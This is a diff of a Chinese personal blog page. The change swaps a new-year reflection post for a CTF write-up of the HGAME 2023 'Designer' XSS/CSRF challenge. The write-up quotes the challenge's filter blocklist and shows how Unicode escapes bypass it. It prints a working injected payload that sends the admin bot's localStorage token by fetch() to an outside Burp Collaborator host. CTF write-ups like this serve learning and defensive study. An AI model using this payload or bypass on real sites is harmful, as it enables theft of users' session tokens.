@@ -16,22 +16,22 @@
   <meta name="author" content="ma5hr00m">
   <meta name="keywords" content="">
   
-    <meta name="description" content="2022的结束,2023的开始,有些想说的话">
+    <meta name="description" content="复现2023HGAME-Week2的一道xss注入题, 以及关联的一点csrf">
 <meta property="og:type" content="article">
-<meta property="og:title" content="2023年的展望">
-<meta property="og:url" content="http://ma5hr00m.top/2023/01/01/2023%E5%B9%B4%E7%9A%84%E5%B1%95%E6%9C%9B/index.html">
+<meta property="og:title" content="2023 HGAME Week2 XSS&amp;CSRF">
+<meta property="og:url" content="http://ma5hr00m.top/2023/01/21/2023-hgame-xss/index.html">
 <meta property="og:site_name" content="ma5hr00m blog">
-<meta property="og:description" content="2022的结束,2023的开始,有些想说的话">
+<meta property="og:description" content="复现2023HGAME-Week2的一道xss注入题, 以及关联的一点csrf">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-01-01T11:45:17.000Z">
-<meta property="article:modified_time" content="2023-01-21T16:14:24.919Z">
+<meta property="article:published_time" content="2023-01-21T14:41:07.000Z">
+<meta property="article:modified_time" content="2023-01-21T16:14:23.832Z">
 <meta property="article:author" content="ma5hr00m">
-<meta property="article:tag" content="📅规划">
+<meta property="article:tag" content="📟CTF">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>2023年的展望 - ma5hr00m blog</title>
+  <title>2023 HGAME Week2 XSS&amp;CSRF - ma5hr00m blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -195,7 +195,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="2023年的展望"></span>
+            <span id="subtitle" data-typed-text="2023 HGAME Week2 XSS&amp;CSRF"></span>
           
         </div>
 
@@ -206,8 +206,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-01-01 19:45" pubdate>
-          2023年1月1日 晚上
+        <time datetime="2023-01-21 22:41" pubdate>
+          2023年1月21日 晚上
         </time>
       </span>
     
@@ -218,7 +218,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.6k 字
+          3k 字
         
       </span>
     
@@ -229,7 +229,7 @@
         
         
         
-          18 分钟
+          34 分钟
         
       </span>
     
@@ -275,47 +275,68 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">2023年的展望</h1>
+            <h1 style="display: none">2023 HGAME Week2 XSS&amp;CSRF</h1>
             
             
               <div class="markdown-body">
                 
-                <h2 id="2022年的回顾"><a href="#2022年的回顾" class="headerlink" title="2022年的回顾"></a>2022年的回顾</h2><p>2022年,其实…过得比较混沌?</p>
-<p>2022年是ma5hr00m高中与大学的交汇之年,生活的各个方面都发生了很大变化,同时也对自己有了新的认知.</p>
-<p>高三时期不想多说,有在努力,但换班导致了很长一段时间的不适应,精神内耗相当严重,整天脑子里都是一些有的没的,浑浑恶恶的做卷子,考试…</p>
-<p>没有后悔,只是偶然间回想起这段时光,会觉得有些错愕.</p>
-<p>高三下学期被封在学校住宿,那段时间,对高考后的生活有了很多幻想,想着好不容易熬过去了,一定要做一些憧憬的事:写小说,画漫画,做视频,练习板绘,画像素画,锻炼身体,学编程…</p>
-<p>理想非常丰满,现实却相当骨感.当然,是因为ma5hr00m的懒惰和拖沓.</p>
-<p>写小说,画漫画,作视频,都完全没有动静;板绘和像素画也只是蜻蜓点水,直到年末才稍微动了几笔;锻炼身体,9月办的学校健身房的卡,直到10月底才开始规律的锻炼;学编程,倒是做了一些,但总是感觉,现在做的好像与我当初想要的不大一样.</p>
-<p>不能说完全没按照高三时的想法执行,但确实做的不多.</p>
-<p>高考后的暑假也是摸鱼居多(耗费大把时间在游戏上),在8月多接触到了vidar-team,在多位学长的引导下逐渐踏入了网络安全领域,并选定了web方向.</p>
-<p>接下来就是大一上学期,可以说,那时的mahr00m没上明白大学,或者说,没有搞清楚大学在人生中的定位.</p>
-<p>很多需要了解的大学基本规则没有搞清楚,导致了效率下降;首次远离父母的监督,同时也没有了高考的重担,整个人有点飘飘然,摸鱼的行为常常出现,注意力也出现了些许下降…这是消极的一面.</p>
-<p>积极向上的事情呢,倒也做了一些,于10月进入vidar-team预备役(10月作为美工进入,12月经过学长的面试作为web进入),并加入杭电助手前端部,其间也在主动的学习新知识,与学长学姐们交流…</p>
-<p>但总感觉,做得不太够.</p>
-<p>期间有过反思,但总是被即时性的享乐精神击溃,导致了这种飘渺的状态的延续.</p>
-<p>ma5hr00m曾经以为自己比较特别,相比之下有着较强的自我管理能力,经过现实的捶打之后,才明白自己的普通.</p>
-<p>可喜的是,年末回家,在2022年最后一段时间里,情况有了一些改善:重新开始写日记,记录每天的生活;跟着学长们打了两场CTF(实际上是在坐牢🔓),并在赛后对赛题进行了复现,查找自己的不足;沉下心来相对认真地画了几天画,技术略有长进;在空闲时间刷了些buuoj上的题目,学点新东西…</p>
-<p>算是对自己这一年的补过?(笑)</p>
-<h2 id="2023的展望"><a href="#2023的展望" class="headerlink" title="2023的展望"></a>2023的展望</h2><p>过去的一年有些乱糟糟,但时间不会停下脚步,2023还是如期而至.</p>
-<p>2021与2022跨年之际的ma5hr00m,是在准备英语听力考试,还在忙些其他的什么事情?记不得了,反正是没有做总结.</p>
-<p>2023年是全新的一年,不出意外的话,今年大部分时间都会呆在学校,而ma5hr00m则会常驻300b,应付好学业后,会有很多空闲时间用来发展自己.</p>
-<p>在这些空闲时间,他可能会做些什么呢?</p>
-<p>他可能会跟着学长们打CTF,逐渐进步,摆脱坐牢的状态;</p>
-<p>他可能会学习web前端开发,朝着自己的理想职业一步步前进;</p>
-<p>他可能会定时练习板绘&#x2F;像素画,慢慢地熟悉人体结构以及运笔技巧;</p>
-<p>他可能会在twitter&#x2F;pixiv上获得关注,迎来自己的粉丝,;</p>
-<p>他可能会在健身房大力推拉,燃烧身上的脂肪,获得一身腱子肉;</p>
-<p>他可能会抽出一些时间看书,增强自己的文学素养,拓宽自己的知识面;</p>
-<p>他可能会坚持记日记,记录自己每天的点点滴滴;</p>
-<p>他可能会尝试画些漫画,做自己之前一直在想却从未付诸实践的事情;</p>
-<p>他可能会去学习安卓应用开发,创造出自己的二次元少女管家(女仆?);</p>
-<p>他可能会尝试打扮自己,做个发型,改变一下形象;</p>
-<p>他可能会坚持早睡早起,养个好身体</p>
-<p>… …</p>
-<p>新的一年,新的365天,ma5hr00m也不知道会发生什么.新的人,新的事,都会让2023年变得神秘,同时更加令人期待.</p>
-<p>但ma5hr00m确定一件事情:</p>
-<p>😋他会做得比2022年更好!</p>
+                <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>ma5hr00m打HGAME2023的时候, 遇到了一道感兴趣的题目, 感觉对xss和csrf加深了一层理解, 于是写篇博客记录一下.</p>
+<p>此时的ma5hr00m还没有熟练使用<code>Yakit</code>, 所以在复现这道题目时使用的工具是<code>BurpSuite Pro</code>, 后续会用<code>Yakit</code>搭配插件进行一波复现.</p>
+<br>
+
+<h2 id="0x01-XSS-amp-CSRF"><a href="#0x01-XSS-amp-CSRF" class="headerlink" title="0x01 XSS&amp;CSRF"></a>0x01 XSS&amp;CSRF</h2><p>公式化地介绍一下xss和csrf.</p>
+<blockquote>
+<p><strong>xss</strong></p>
+<p>跨站点脚本（也称为 XSS）是一种网络安全漏洞，允许攻击者破坏用户与易受攻击的应用程序的交互。它允许攻击者规避同源策略，该策略旨在将不同的网站彼此隔离。跨站点脚本漏洞通常允许攻击者伪装成受害用户，执行用户能够执行的任何操作，并访问用户的任何数据。如果受害用户在应用程序中具有特权访问权限，则攻击者可能能够完全控制应用程序的所有功能和数据。 </p>
+<p>跨站点脚本通过操纵易受攻击的网站来工作，以便它向用户返回恶意 JavaScript。当恶意代码在受害者的浏览器中执行时，攻击者可以完全破坏他们与应用程序的交互。</p>
+<p>xss的恶意代码一般指的是JavaScript, 也可以简单地理解为JavaScript注入 ( ? ).</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting">🔗原文👈</a></p>
+</blockquote>
+<blockquote>
+<p><strong>csrf</strong></p>
+<p>跨站点请求伪造（也称为 CSRF）是一种网络安全漏洞，允许攻击者诱使用户执行他们不打算执行的操作。它允许攻击者部分规避同源策略，该策略旨在防止不同网站相互干扰。</p>
+<p>在成功的 CSRF 攻击中，攻击者会导致受害用户无意中执行某个操作。例如，这可能是更改他们帐户上的电子邮件地址、更改密码或进行资金转帐。根据操作的性质，攻击者可能能够完全控制用户的帐户。如果受感染的用户在应用程序中具有特权角色，则攻击者可能能够完全控制应用程序的所有数据和功能。</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf">🔗原文👈</a></p>
+</blockquote>
+<p>就我个人理解来说, xss是针对用户发起的攻击, 网站携带的恶意脚本在客户端肆意妄为地窃取用户信息 ( 如常见的cookie, token ) ; 而csrf是在xss的基础上对网站本身发起的攻击, 伪装成合法用户请求执行网站的某个特定功能, 以此获得网站内部数据或者对网站进行破坏.</p>
+<br>
+
+<h2 id="0x02-HGAME2023-Designer"><a href="#0x02-HGAME2023-Designer" class="headerlink" title="0x02 HGAME2023 Designer"></a>0x02 HGAME2023 Designer</h2><p>两种做法, 一种是xss转发token, 另一种是xss打csrf访问admin接口获取token.</p>
+<h3 id="XSS窃取token"><a href="#XSS窃取token" class="headerlink" title="XSS窃取token"></a>XSS窃取token</h3><p>首先进入目标页面, 打开后是一个<code>register</code>页面, 输入<code>hacker</code>后进入<code>button edit</code>页面, 写有<code>save</code>, <code>preview</code> 和 <code>share</code>三个功能.</p>
+<p>一番测试后, 确定注入点为<code>Box shadow</code>属性, 通过<code>preview</code>功能可以发现该表单中的数据会直接作为<code>html code</code>执行.</p>
+<p>我们可以通过添加<code>href</code>属性, 然后利用<code>javascript</code>协议注入恶意代码.</p>
+<p>但在测试过程中, 尝试注入<code>alert(1)</code>时, 会发现该属性所在的<code>html</code>代码被删除, 推测存在关键词过滤.</p>
+<p>根据赛方提供的附件中的<code>index.js</code>, 我们可以得知前端过滤的黑名单.</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">[</span>/on/i<span class="hljs-punctuation">,</span> /localStorage/i<span class="hljs-punctuation">,</span> /alert/<span class="hljs-punctuation">,</span> /fetch/<span class="hljs-punctuation">,</span> /XMLHttpRequest/<span class="hljs-punctuation">,</span> /window/<span class="hljs-punctuation">,</span> /location/<span class="hljs-punctuation">,</span> /document/<span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure>
+
+<p>我们可以通过<code>Unicode编码</code>绕过.</p>
+<p>再研究附件, 我们可以根据js代码判断flag隐藏在admin的token中.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/user/register&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span><br>  <span class="hljs-keyword">let</span> flag = <span class="hljs-string">&quot;hgame&#123;fake_flag_here&#125;&quot;</span><br>  <span class="hljs-keyword">if</span> (username == <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; req.<span class="hljs-property">ip</span> == <span class="hljs-string">&quot;127.0.0.1&quot;</span> || req.<span class="hljs-property">ip</span> == <span class="hljs-string">&quot;::ffff:127.0.0.1&quot;</span>) &#123;<br>    flag = <span class="hljs-string">&quot;hgame&#123;true_flag_here&#125;&quot;</span><br>  &#125;<br>  <span class="hljs-keyword">const</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; username, flag &#125;, secret)<br>  res.<span class="hljs-title function_">json</span>(&#123; token &#125;)<br>&#125;)<br></code></pre></td></tr></table></figure>
+
+<p>当我们<code>share</code>一个<code>button</code>样式后, 会有弹窗提示<code>admin will see it later</code>, 询问出题人后, 得知会有一个<code>bot</code>模拟管理员, 间隔一段时间点击上传的按钮, hacker的目的是窃取管理员存储在<code>localStorage</code>中的<code>token</code>, 并转发到hacker的服务器上, 所以构造出以下exp.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">3px 3px #<span class="hljs-number">000</span>;<span class="hljs-string">&quot;href=&quot;</span><span class="hljs-attr">javascript</span>:<br>fe\<span class="hljs-title function_">u0074ch</span>(<span class="hljs-string">&#x27;https://vpo3zoujlz48l6dnqm0w0ocl4ca2yr.burpcollaborator.net&#x27;</span>, &#123;<br><span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br><span class="hljs-attr">mode</span>: <span class="hljs-string">&#x27;no-cors&#x27;</span>,<br><span class="hljs-attr">body</span>:lo\u0063alS\u0074orage.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;token&#x27;</span>)<br>&#125;)<br></code></pre></td></tr></table></figure>
+
+<p>稍等一段时间后, 接受数据并对<code>token</code>进行JWT分析, 得到了存储于payload中的flag.</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;flag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;hgame&#123;b_c4re_ab0ut_prop3rt1ty_injEctiOn&#125;&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;iat&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1673684032</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>BurpSuite提供了便利的<code>Collaborator Client</code>, 可以直接把信息转发到这个客户端处, 之后可以就可以接收到发送过来的<code>post</code>请求.</p>
+<h3 id="XSS打CSRF窃取token"><a href="#XSS打CSRF窃取token" class="headerlink" title="XSS打CSRF窃取token"></a>XSS打CSRF窃取token</h3><p>找注入点前面都一样, 不赘述, 不同的是找到注入点之后的操作.</p>
+<p>根据附件中的内容, 我们可以发现<code>share</code>之后, 浏览器渲先染页面再设置<code>jwt</code>, 再之后<code>bot</code>点击按钮.</p>
+<p><code>web</code>👋都了解浏览器的基本运作流程, 渲染页面时会优先执行<code>&lt;script&gt;</code>标签内容, 这样就可以在触发恶意js脚本. 但此时, <code>localStorage</code>中还没有所需的<code>token</code>, 那我们可以想到模仿admin访问一些接口来主动获取<code>token</code>, 然后再转发给<code>hacker</code>.</p>
+<p>所以, 可以构造一个exp, 模拟admin去访问<code>/user/register</code>接口, 这样就可以返回已有的<code>token</code>, 再转发到<code>hakcer</code>.</p>
+<p>这就是一个xss打csrf的过程.</p>
+<p>根据这个题, 我们可以稍微理解一下csrf的定位:</p>
+<p>csrf是xss的进一步延伸, 在某些情况下, hacker通过传统的xss可能无法获得所需的cookie等用户数据, 这种时候就可以尝试用xss打csrf伪造身份请求一些危险的接口, 以此获得想要的数据.</p>
+<br>
+
+<h2 id="0x03-后话"><a href="#0x03-后话" class="headerlink" title="0x03 后话"></a>0x03 后话</h2><blockquote>
+<p>跨越时空的新年祝福 ( x )</p>
+</blockquote>
+<p>这篇博客本来是20号开始写的, 但有点事耽搁了, 于是就出现了除夕夜写博客的状况.</p>
+<p>直到刚刚, 码着字跨年了.</p>
+<p>所以… 2023新年快乐!</p>
+<p>本来想写一篇新年计划, 但觉得和之前的博客重合度有些高, 就不单独写了, 深深地印在脑海里吧.</p>
+<p>反正最后的宗旨都是变得更好!</p>
 
                 
               </div>
@@ -328,7 +349,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%F0%9F%93%85%E8%A7%84%E5%88%92/">#📅规划</a>
+        <a href="/tags/%F0%9F%93%9FCTF/">#📟CTF</a>
       
     </div>
   
@@ -340,8 +361,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>2023年的展望</div>
-      <div>http://ma5hr00m.top/2023/01/01/2023年的展望/</div>
+      <div>2023 HGAME Week2 XSS&amp;CSRF</div>
+      <div>http://ma5hr00m.top/2023/01/21/2023-hgame-xss/</div>
     </div>
     <div class="license-meta">
       
@@ -353,7 +374,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年1月1日</div>
+          <div>2023年1月21日</div>
         </div>
       
       
@@ -385,18 +406,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/01/19/%E5%88%9D%E6%AC%A1%E6%8E%A2%E7%B4%A2Linux/" title="初次探索Linux">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">初次探索Linux</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/12/24/2022-pwnhub/" title="2022 PwnHub WriteUp">
-                        <span class="hidden-mobile">2022 PwnHub WriteUp</span>
+                      <a href="/2023/01/19/%E5%88%9D%E6%AC%A1%E6%8E%A2%E7%B4%A2Linux/" title="初次探索Linux">
+                        <span class="hidden-mobile">初次探索Linux</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
